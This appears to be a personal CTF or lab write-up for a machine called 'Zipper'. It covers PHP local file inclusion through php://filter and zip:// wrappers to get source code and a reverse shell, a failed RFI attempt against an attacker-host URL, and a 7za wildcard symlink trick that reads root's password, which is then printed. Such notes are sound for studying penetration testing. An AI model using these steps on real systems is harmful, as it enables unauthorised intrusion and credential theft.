# Zipper \[Hard]

## Report

Port 80 has a file upload functionality that zips any file you upload and we find an input paramater 'page' which we completely control, use this to view source of all PHP files, 'home','index' and 'upload' using PHP wrappers. Obtain reverse shell via zip PHP wrapper and find a cronjob running zip using wildcard. Add a symlink and extract root password.&#x20;

### Writeup

> With this online ZIP converter you can compress your files and create a ZIP archive. Reduce file size and save bandwidth with ZIP compression. Your uploaded files are encrypted and no one can access them.

Hm… It seems like this is a zip\* exploitation. If only we could see the code. It’s definitely not Zipslip since it didn’t unzip the zip for us.

## Cheatsheet

```
http://192.168.137.229/index.php?file=php://filter/convert.base64-encode/resource=home
http://192.168.137.229/index.php?file=zip://uploads/upload_1759138402.zip%23rev

ln -s /root/secret enox.zip
touch @enox.zip
cat /opt/backups/backup.log
```

## Loot

### Enumeration

192.168.137.229

22 and 80

Popper 1.13 exploit RFI - FAIL

`http://192.168.137.229/popper/childwindow.inc.php?form=http://192.168.45.243/what`

* Any file is accepted \[x-php in request they didnt care]
* request sent to '/'
* files stored in 'uploads'
* file name is timestamp converted to EPOCH - we can already fetch whatever we uploaded tho does this matter?
* downloading is also via URL, no input parameter we control\
  `GET /uploads/upload_1759135662.zip`
* index.php, home.php -> same and upload.php which doesnt return anything
* can we zip a file thats alr zipped? - it zips that too
* we know zip command is being used - maybe command injection? \[ping at filename and name didn't work]
* **changing name seems to break the zip command - maybe if we guess epoch we can access?**
* We are expected to break the logic aren't we - figure the error response
* PHP also running we are supposed to send a PHP payload only
* filename doesn't matter because it sets that name for the file within the zip not even the file name uploaded

#### Create zip of multiple uploaded files - this has to be the hint (apparently not)

<figure><img src="../../.gitbook/assets/image (117).png" alt=""><figcaption><p>mess around with name and filename</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (119).png" alt=""><figcaption><p>HOVERING OVER THE LOGO AND HOME TEXT WE SEE A PARAMETER 'FILE' OMGGGG FFSSSSSSS</p></figcaption></figure>

### Attack Vectors

{% code title="http://192.168.137.229/index.php?file=php://filter/convert.base64-encode/resource=home" %}
```php
<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Zipper</title>

</head>
<body>
<?php include 'upload.php'; ?>

<div class="jumbotron">
  <div class="container">
    <h1 class="display-3">Welcome to Zipper!</h1>
    <p class="lead">
      With this online ZIP converter you can compress your files and create a ZIP archive. Reduce file size and save bandwidth with ZIP compression. 
      Your uploaded files are encrypted and no one can access them.
    </p>
    <hr class="my-4">
    <div class="page-container row-12">
    		<h4 class="col-12 text-center mb-5">Create Zip File of Multiple Uploaded Files </h4>
    		<div class="row-8 form-container">
            <?php 
            if(!empty($error)) { 
            ?>
    			<p class="error text-center"><?php echo $error; ?></p>
            <?php 
            }
            ?>
            <?php 
            if(!empty($success)) { 
            ?>
    			<p class="success text-center">
            Files uploaded successfully and compressed into a zip format
            </p>
            <p class="success text-center">
            <a href="uploads/<?php echo $success; ?>" target="__blank">Click here to download the zip file</a>
            </p>
	    	    <?php 
            }
            ?>
		    	<form action="" method="post" enctype="multipart/form-data">
				    <div class="input-group">
						<div class="input-group-prepend">
						    <input type="submit" class="btn btn-primary" value="Upload">
						</div>
						<div class="custom-file">
						    <input type="file" class="custom-file-input" name="img[]" multiple>
						    <label class="custom-file-label" >Choose File</label>
						</div>
					</div>
				</form>
				
    		</div>
		</div>
  </div>
</div>

<div class="container">
  <footer>
    <p>&copy; Zipper 2021</p>
  </footer>
</div> <!-- /.container -->

</body>
</html>
```
{% endcode %}

{% code title="index.php" %}
```php
<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file".".php");
}
else
{
include("home.php");
}
?>
```
{% endcode %}

{% code title="upload.php incase you want it" %}
```php
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}

```
{% endcode %}

```php
http://192.168.137.229/index.php?file=zip://uploads/upload_1759138402.zip%23rev
```

### PrivEsc

{% code title="backup.sh" %}
```bash
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```
{% endcode %}

Only one zip file would get this thing to work, having multiple payloads did not cut it idk why \[spoiler the answer was already there why tho]

<figure><img src="../../.gitbook/assets/image (120).png" alt=""><figcaption></figcaption></figure>

### Creds

root:WildCardsGoingWild

### Proof

The backup.sh script explicitly mentions the location of root's password

{% embed url="https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/wildcards-spare-tricks.html" %}
